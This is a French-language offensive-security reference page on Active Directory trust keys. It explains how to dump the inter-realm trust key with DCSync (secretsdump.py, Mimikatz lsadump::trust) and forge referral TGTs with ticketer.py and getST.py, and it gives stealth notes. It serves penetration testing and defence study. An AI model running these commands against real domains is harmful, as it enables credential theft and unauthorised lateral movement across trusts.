---
title: "Clés d'approbation et tickets inter-domaines"
order: 4
description: "Extraire la clé d'approbation inter-domaines depuis l'objet du domaine approuvé et l'utiliser pour forger des tickets de référence inter-domaines qui traversent une approbation Active Directory, puis demander des tickets de service dans le domaine cible."
keywords:
  - trust key
  - inter-realm TGT
  - trust account
  - referral ticket
  - trustedDomain
---

# Clés d'approbation et tickets inter-domaines

Chaque approbation s'appuie sur un secret partagé : une **clé d'approbation**, stockée comme mot de passe d'un **compte d'approbation** inter-domaines (`<DOMAIN>$`) et utilisée pour chiffrer les **tickets de référence** qui permettent à un principal d'un domaine de demander des tickets de service dans un autre. Détenir cette clé vous permet de forger ces tickets de référence directement, en vous déplaçant à travers l'approbation sans que le privilège forgé vive à l'intérieur d'un golden ticket. C'est le mécanisme de plus bas niveau qui sous-tend à la fois le mouvement intra-forêt et inter-forêts.

**Lignage.** Le SID history a débuté comme une fonctionnalité de migration légitime, permettant à un compte migré de conserver son ancien accès. Le filtrage de SID et la quarantaine ont été ajoutés comme frontière contre l'abus, et forger des tickets inter-domaines avec la clé d'approbation, conjointement à l'injection d'extraSids, sont les moyens modernes de traverser une approbation lorsque ce filtrage est relâché.

## Extraire la clé d'approbation

La clé d'approbation est la clé du compte d'approbation, récupérable par [DCSync](../authentication/credentials/ntds-and-dcsync.md) une fois un domaine compromis :

```bash
# Dump trust keys (the [in]/[out] trust account hashes) along with the domain
secretsdump.py -just-dc 'EXAMPLE/admin:password@dc.example.local'
# Look for the "<trusted-domain>$" trust account entries and their trust keys
lsadump::trust /patch        # Mimikatz: dump trust keys on the DC
```

## Forger un ticket inter-domaines

Avec la clé d'approbation, forgez un TGT de référence inter-domaines pour l'approbation, puis présentez-le au KDC du domaine cible pour y obtenir des tickets de service :

```bash
# Forge the inter-realm TGT using the trust key, then request a service ticket
ticketer.py -nthash <trust-key> -domain-sid <SOURCE-domain-SID> \
  -domain source.example.local -spn krbtgt/target.example.local Administrator
export KRB5CCNAME=Administrator.ccache
getST.py -k -no-pass -spn cifs/target-host.target.example.local target.example.local/Administrator
```

À l'intérieur d'une forêt, le ticket de référence peut aussi porter une revendication `extraSids` (le chemin du SID history) ; à travers une approbation de forêt, le filtrage de SID la retire, de sorte que le ticket n'octroie que ce que le principal nommé possède légitimement dans la cible.

## Notes d'exploitation

- La clé d'approbation est propre à chaque approbation et change lors de la rotation du mot de passe de l'approbation (environ tous les 30 jours), une clé extraite est donc limitée dans le temps, contrairement à un golden ticket basé sur `krbtgt`.
- Forger le TGT inter-domaines est plus discret qu'un golden ticket complet pour traverser une approbation, car il utilise le vrai mécanisme de référence plutôt que de fabriquer un TGT de domaine.
- La valeur de l'accès obtenu dépend du type d'approbation : non filtré (intra-forêt, ou une approbation de forêt avec filtrage désactivé) permet à `extraSids` d'escalader ; une approbation de forêt filtrée vous limite à l'accès accordé du principal (voir [approbations inter-forêts](cross-forest-trusts.md)).

## Outils

- **Impacket** (`secretsdump.py`, `ticketer.py`, `getST.py`) : extraire les clés d'approbation et forger des tickets inter-domaines.
- **Mimikatz** (`lsadump::trust`, `kerberos::golden /service:krbtgt /target:`) : extraction de clé d'approbation et forge de ticket inter-domaines.

## Références

- The Hacker Recipes: trust tickets and inter-realm TGTs
- Microsoft: domain trusts and referral tickets
